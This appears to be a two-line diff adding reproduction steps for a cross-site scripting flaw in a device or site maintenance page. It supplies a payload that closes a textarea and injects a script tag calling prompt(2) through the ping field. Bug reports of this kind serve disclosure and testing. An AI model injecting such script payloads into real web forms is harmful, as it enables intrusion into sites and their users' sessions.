@@ -1,0 +1,2 @@
+1. Go to http://www.example.com/maintenance/tools_test.htm
+2. make ping like </textarea><script>prompt(2)</script>
